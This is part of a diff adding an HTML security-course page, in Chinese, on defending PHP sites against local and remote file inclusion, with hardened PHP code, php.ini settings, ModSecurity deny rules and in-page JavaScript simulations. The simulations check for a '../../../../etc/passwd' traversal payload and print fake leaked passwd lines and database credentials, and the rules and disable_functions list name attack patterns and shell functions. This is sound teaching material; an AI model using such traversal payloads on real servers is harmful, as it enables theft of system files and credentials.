+                    <div class="code-block">
+                        <div class="code-label">PHP - 字符過濾</div>
+                        <pre><span class="keyword">&lt;?php</span>
+<span class="comment">// 移除路徑遍歷字符</span>
+<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">'page'</span>];
+
+<span class="comment">// 移除 ../ 和 ..\</span>
+<span class="variable">$page</span> = <span class="function">str_replace</span>([<span class="string">'../'</span>, <span class="string">'..\\'</span>, <span class="string">'..\\' </span>], <span class="string">''</span>, <span class="variable">$page</span>);
+
+<span class="comment">// 移除空字節</span>
+<span class="variable">$page</span> = <span class="function">str_replace</span>(<span class="string">"\0"</span>, <span class="string">''</span>, <span class="variable">$page</span>);
+
+<span class="comment">// 只允許字母、數字、底線和連字號</span>
+<span class="keyword">if</span> (!<span class="function">preg_match</span>(<span class="string">'/^[a-zA-Z0-9_-]+$/'</span>, <span class="variable">$page</span>)) {
+    <span class="keyword">die</span>(<span class="string">"Invalid page name"</span>);
+}
+
+<span class="function">include</span>(<span class="string">"pages/"</span> . <span class="variable">$page</span> . <span class="string">".php"</span>);
+<span class="keyword">?&gt;</span></pre>
+                    </div>
+                </div>
+
+                <h3>3. 使用絕對路徑和 basename()</h3>
+                <div class="example-container">
+                    <div class="code-block">
+                        <div class="code-label">PHP - 路徑控制</div>
+                        <pre><span class="keyword">&lt;?php</span>
+<span class="comment">// 定義基礎目錄</span>
+<span class="variable">$base_dir</span> = <span class="string">'/var/www/html/pages/'</span>;
+
+<span class="comment">// 獲取使用者輸入，只保留文件名</span>
+<span class="variable">$page</span> = <span class="function">basename</span>(<span class="variable">$_GET</span>[<span class="string">'page'</span>]);
+
+<span class="comment">// 建構完整路徑</span>
+<span class="variable">$file_path</span> = <span class="variable">$base_dir</span> . <span class="variable">$page</span> . <span class="string">'.php'</span>;
+
+<span class="comment">// 驗證文件是否存在且在允許的目錄內</span>
+<span class="variable">$real_path</span> = <span class="function">realpath</span>(<span class="variable">$file_path</span>);
+
+<span class="keyword">if</span> (<span class="variable">$real_path</span> && <span class="function">strpos</span>(<span class="variable">$real_path</span>, <span class="variable">$base_dir</span>) === <span class="number">0</span> && <span class="function">file_exists</span>(<span class="variable">$real_path</span>)) {
+    <span class="function">include</span>(<span class="variable">$real_path</span>);
+} <span class="keyword">else</span> {
+    <span class="keyword">die</span>(<span class="string">"File not found"</span>);
+}
+<span class="keyword">?&gt;</span></pre>
+                    </div>
+                </div>
+
+                <h3>4. PHP 配置安全設定</h3>
+                <div class="example-container">
+                    <div class="code-block">
+                        <div class="code-label">php.ini 安全設定</div>
+                        <pre><span class="comment">; 禁止遠端文件包含（必須設定）</span>
+<span class="variable">allow_url_include</span> = <span class="string">Off</span>
+
+<span class="comment">; 禁止使用 fopen 打開遠端文件（建議）</span>
+<span class="variable">allow_url_fopen</span> = <span class="string">Off</span>
+
+<span class="comment">; 限制可訪問的目錄</span>
+<span class="variable">open_basedir</span> = <span class="string">"/var/www/html:/tmp"</span>
+
+<span class="comment">; 禁用危險函數</span>
+<span class="variable">disable_functions</span> = <span class="string">exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</span>
+
+<span class="comment">; 關閉錯誤顯示（生產環境）</span>
+<span class="variable">display_errors</span> = <span class="string">Off</span>
+<span class="variable">log_errors</span> = <span class="string">On</span></pre>
+                    </div>
+                </div>
+
+                <h3>5. 使用安全框架</h3>
+                <div class="example-container">
+                    <div class="example-title">現代框架的路由系統</div>
+                    <div class="code-block">
+                        <div class="code-label">Laravel 路由範例</div>
+                        <pre><span class="comment">// Laravel 等現代框架使用路由而非直接文件包含</span>
+<span class="comment">// routes/web.php</span>
+
+<span class="function">Route::get</span>(<span class="string">'/home'</span>, <span class="keyword">function</span>() {
+    <span class="keyword">return</span> <span class="function">view</span>(<span class="string">'home'</span>);
+});
+
+<span class="function">Route::get</span>(<span class="string">'/about'</span>, <span class="keyword">function</span>() {
+    <span class="keyword">return</span> <span class="function">view</span>(<span class="string">'about'</span>);
+});
+
+<span class="comment">// 使用者無法直接控制包含哪個文件</span>
+<span class="comment">// 所有路由都經過框架驗證</span></pre>
+                    </div>
+                </div>
+
+                <h3>6. Web Application Firewall (WAF)</h3>
+                <div class="info-box">
+                    <strong>WAF 規則範例（ModSecurity）：</strong>
+                    <div class="code-block" style="margin-top: 15px;">
+                        <pre><span class="comment"># 阻擋常見的路徑遍歷攻擊</span>
+SecRule ARGS <span class="string">"@contains ../"</span> <span class="string">"id:1,deny,status:403"</span>
+
+<span class="comment"># 阻擋 PHP Filter 攻擊</span>
+SecRule ARGS <span class="string">"@contains php://filter"</span> <span class="string">"id:2,deny,status:403"</span>
+
+<span class="comment"># 阻擋遠端文件包含</span>
+SecRule ARGS <span class="string">"@rx (http|https|ftp)://"</span> <span class="string">"id:3,deny,status:403"</span></pre>
+                    </div>
+                </div>
+
+                <h3>防禦措施檢查清單</h3>
+                <table class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>防禦措施</th>
+                            <th>重要性</th>
+                            <th>實施難度</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>✅ 使用白名單驗證輸入</td>
+                            <td>🔴 極高</td>
+                            <td>🟢 簡單</td>
+                        </tr>
+                        <tr>
+                            <td>✅ 關閉 allow_url_include</td>
+                            <td>🔴 極高</td>
+                            <td>🟢 簡單</td>
+                        </tr>
+                        <tr>
+                            <td>✅ 使用 basename() 過濾路徑</td>
+                            <td>🟡 高</td>
+                            <td>🟢 簡單</td>
+                        </tr>
+                        <tr>
+                            <td>✅ 設定 open_basedir 限制</td>
+                            <td>🟡 高</td>
+                            <td>🟡 中等</td>
+                        </tr>
+                        <tr>
+                            <td>✅ 驗證文件真實路徑</td>
+                            <td>🟡 高</td>
+                            <td>🟡 中等</td>
+                        </tr>
+                        <tr>
+                            <td>✅ 使用現代框架路由</td>
+                            <td>🟡 高</td>
+                            <td>🔴 需重構</td>
+                        </tr>
+                        <tr>
+                            <td>✅ 部署 WAF</td>
+                            <td>🟡 中</td>
+                            <td>🟡 中等</td>
+                        </tr>
+                        <tr>
+                            <td>✅ 定期安全審計</td>
+                            <td>🟡 中</td>
+                            <td>🟡 中等</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>完整的安全實作範例</h3>
+                <div class="example-container">
+                    <div class="code-block">
+                        <div class="code-label">PHP - 完整安全方案</div>
+                        <pre><span class="keyword">&lt;?php</span>
+<span class="comment">// 完整的安全文件包含實作</span>
+
+<span class="keyword">class</span> <span class="function">SecureFileInclude</span> {
+    <span class="keyword">private</span> <span class="variable">$base_dir</span> = <span class="string">__DIR__</span> . <span class="string">'/pages/'</span>;
+    <span class="keyword">private</span> <span class="variable">$allowed_pages</span> = [
+        <span class="string">'home'</span>, <span class="string">'about'</span>, <span class="string">'contact'</span>, <span class="string">'products'</span>
+    ];
+    
+    <span class="keyword">public function</span> <span class="function">includePage</span>(<span class="variable">$page_name</span>) {
+        <span class="comment">// 1. 設定預設值</span>
+        <span class="variable">$page_name</span> = <span class="variable">$page_name</span> ?: <span class="string">'home'</span>;
+        
+        <span class="comment">// 2. 白名單驗證</span>
+        <span class="keyword">if</span> (!<span class="function">in_array</span>(<span class="variable">$page_name</span>, <span class="variable">$this</span>-><span class="variable">allowed_pages</span>, <span class="keyword">true</span>)) {
+            <span class="keyword">return</span> <span class="variable">$this</span>-><span class="function">notFound</span>();
+        }
+        
+        <span class="comment">// 3. 使用 basename 防止路徑遍歷</span>
+        <span class="variable">$safe_name</span> = <span class="function">basename</span>(<span class="variable">$page_name</span>);
+        
+        <span class="comment">// 4. 建構完整路徑</span>
+        <span class="variable">$file_path</span> = <span class="variable">$this</span>-><span class="variable">base_dir</span> . <span class="variable">$safe_name</span> . <span class="string">'.php'</span>;
+        
+        <span class="comment">// 5. 取得真實路徑並驗證</span>
+        <span class="variable">$real_path</span> = <span class="function">realpath</span>(<span class="variable">$file_path</span>);
+        
+        <span class="comment">// 6. 確保文件在允許的目錄內</span>
+        <span class="keyword">if</span> (!<span class="variable">$real_path</span> || <span class="function">strpos</span>(<span class="variable">$real_path</span>, <span class="variable">$this</span>-><span class="variable">base_dir</span>) !== <span class="number">0</span>) {
+            <span class="keyword">return</span> <span class="variable">$this</span>-><span class="function">notFound</span>();
+        }
+        
+        <span class="comment">// 7. 確認文件存在</span>
+        <span class="keyword">if</span> (!<span class="function">file_exists</span>(<span class="variable">$real_path</span>)) {
+            <span class="keyword">return</span> <span class="variable">$this</span>-><span class="function">notFound</span>();
+        }
+        
+        <span class="comment">// 8. 安全地包含文件</span>
+        <span class="keyword">include</span> <span class="variable">$real_path</span>;
+    }
+    
+    <span class="keyword">private function</span> <span class="function">notFound</span>() {
+        <span class="function">http_response_code</span>(<span class="number">404</span>);
+        <span class="keyword">echo</span> <span class="string">"Page not found"</span>;
+    }
+}
+
+<span class="comment">// 使用範例</span>
+<span class="variable">$includer</span> = <span class="keyword">new</span> <span class="function">SecureFileInclude</span>();
+<span class="variable">$includer</span>-><span class="function">includePage</span>(<span class="variable">$_GET</span>[<span class="string">'page'</span>] ?? <span class="string">'home'</span>);
+<span class="keyword">?&gt;</span></pre>
+                    </div>
+                </div>
+
+                <div class="success-box">
+                    <strong>🎯 關鍵要點：</strong>
+                    <ul>
+                        <li><strong>多層防禦</strong>：不要依賴單一防禦機制</li>
+                        <li><strong>預設拒絕</strong>：只允許明確被授權的操作</li>
+                        <li><strong>最小權限</strong>：限制 PHP 和文件系統的權限</li>
+                        <li><strong>持續監控</strong>：記錄可疑活動並定期審查</li>
+                        <li><strong>定期更新</strong>：保持 PHP 和系統套件最新版本</li>
+                    </ul>
+                </div>
+            </section>
+        </div>
+
+        <footer>
+            <p><strong>網站安全教學</strong> - PHP 文件包含漏洞與防護</p>
+            <p>© 2025 feifei.tw 資訊安全課程教材 | 僅供教育用途</p>
+            <p style="margin-top: 10px; font-size: 0.9em;">
+                ⚠️ 警告：本教材內容僅供學習和研究使用。<br>
+                未經授權對他人系統進行滲透測試是違法行為。
+            </p>
+        </footer>
+    </div>
+
+    <script>
+        // 導航功能
+        document.querySelectorAll('.nav-btn').forEach(button => {
+            button.addEventListener('click', function() {
+                // 移除所有 active 類別
+                document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
+                document.querySelectorAll('.section').forEach(section => section.classList.remove('active'));
+                
+                // 添加 active 到當前按鈕和對應區塊
+                this.classList.add('active');
+                const sectionId = this.getAttribute('data-section');
+                document.getElementById(sectionId).classList.add('active');
+                
+                // 滾動到頂部
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        });
+
+        // LFI 模擬
+        function simulateLFI() {
+            const input = document.getElementById('lfiInput').value;
+            const output = document.getElementById('lfiOutput');
+            
+            if (!input) {
+                output.textContent = '❌ 請輸入文件路徑';
+                return;
+            }
+            
+            output.innerHTML = `<span style="color: #e06c75;">🔍 模擬 LFI 攻擊...</span>\n\n`;
+            output.innerHTML += `<span style="color: #61afef;">請求:</span> ?page=${input}\n`;
+            output.innerHTML += `<span style="color: #61afef;">執行:</span> include('${input}.php')\n\n`;
+            
+            // 模擬不同的攻擊結果
+            if (input.includes('../../../../etc/passwd')) {
+                output.innerHTML += `<span style="color: #98c379;">✅ 成功讀取 /etc/passwd</span>\n\n`;
+                output.innerHTML += `root:x:0:0:root:/root:/bin/bash\n`;
+                output.innerHTML += `daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n`;
+                output.innerHTML += `www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n`;
+                output.innerHTML += `...(更多使用者)`;
+            } else if (input.includes('config')) {
+                output.innerHTML += `<span style="color: #98c379;">✅ 成功讀取配置文件</span>\n\n`;
+                output.innerHTML += `<?php\n`;
+                output.innerHTML += `$db_host = "localhost";\n`;
+                output.innerHTML += `$db_user = "admin";\n`;
+                output.innerHTML += `$db_pass = "P@ssw0rd123";\n`;
+                output.innerHTML += `?>`;
+            } else {
+                output.innerHTML += `<span style="color: #e5c07b;">⚠️ 文件不存在或無法讀取</span>`;
+            }
+        }
+
+        function clearLFI() {
+            document.getElementById('lfiOutput').textContent = '等待輸入...';
+        }
+
+        // RFI 模擬
+        function simulateRFI() {
+            const input = document.getElementById('rfiInput').value;
+            const output = document.getElementById('rfiOutput');
+            
+            if (!input) {
+                output.textContent = '❌ 請輸入遠端 URL';
+                return;
+            }
+            
+            output.innerHTML = `<span style="color: #e06c75;">🔍 模擬 RFI 攻擊...</span>\n\n`;
+            output.innerHTML += `<span style="color: #61afef;">請求:</span> ?page=${input}\n`;
+            output.innerHTML += `<span style="color: #61afef;">執行:</span> include('${input}')\n\n`;
+            
+            if (input.includes('http://') || input.includes('https://')) {
+                output.innerHTML += `<span style="color: #e06c75;">🚨 嚴重警告！</span>\n\n`;
+                output.innerHTML += `<span style="color: #98c379;">✅ 成功包含遠端文件</span>\n`;
+                output.innerHTML += `<span style="color: #98c379;">✅ 執行惡意程式碼</span>\n`;
+                output.innerHTML += `<span style="color: #98c379;">✅ 建立後門成功</span>\n\n`;
+                output.innerHTML += `<span style="color: #e5c07b;">⚠️ 伺服器已被完全控制！</span>\n`;
+                output.innerHTML += `攻擊者可以：\n`;
+                output.innerHTML += `- 執行任意系統命令\n`;
+                output.innerHTML += `- 讀取/修改所有文件\n`;
+                output.innerHTML += `- 上傳更多惡意檔案\n`;
+                output.innerHTML += `- 竊取敏感資料`;
+            } else {
+                output.innerHTML += `<span style="color: #e5c07b;">⚠️ URL 格式不正確</span>`;
+            }
+        }
+
+        function clearRFI() {
+            document.getElementById('rfiOutput').textContent = '等待輸入...';
+        }
+
+        // PHP Filter Base64 編碼/解碼
+        function encodeBase64() {
+            const input = document.getElementById('filterInput').value;
+            const output = document.getElementById('filterOutput');
+            
+            if (!input) {
+                output.textContent = '❌ 請輸入要編碼的內容';
+                return;
+            }
+            
+            try {
+                const encoded = btoa(unescape(encodeURIComponent(input)));
+                output.innerHTML = `<span style="color: #61afef;">Base64 編碼結果:</span>\n\n`;
+                output.innerHTML += `<span style="color: #98c379;">${encoded}</span>\n\n`;
+                output.innerHTML += `<span style="color: #abb2bf;">這就是攻擊者會看到的內容！\n`;
+                output.innerHTML += `攻擊者需要再解碼才能看到原始程式碼。</span>`;
+            } catch (e) {
+                output.textContent = '❌ 編碼失敗：' + e.message;
+            }
+        }
+
+        function decodeBase64() {
+            const input = document.getElementById('filterInput').value;
+            const output = document.getElementById('filterOutput');
+            
+            if (!input) {
+                output.textContent = '❌ 請輸入要解碼的 Base64 字串';
+                return;
+            }
+            
+            try {
+                const decoded = decodeURIComponent(escape(atob(input)));
+                output.innerHTML = `<span style="color: #61afef;">Base64 解碼結果:</span>\n\n`;
+                output.innerHTML += `<span style="color: #98c379;">${decoded}</span>\n\n`;
+                output.innerHTML += `<span style="color: #abb2bf;">成功還原原始內容！</span>`;
+            } catch (e) {
+                output.textContent = '❌ 解碼失敗：這不是有效的 Base64 字串';
+            }
+        }
+
+        function clearFilter() {
+            document.getElementById('filterOutput').textContent = '等待輸入...';
+        }
+
+        // 鍵盤快捷鍵（Enter 執行）
+        document.getElementById('lfiInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') simulateLFI();
+        });
+
+        document.getElementById('rfiInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') simulateRFI();
+        });
+
+        document.getElementById('filterInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && e.ctrlKey) encodeBase64();
+        });
+    </script>
+</body>
+</html>
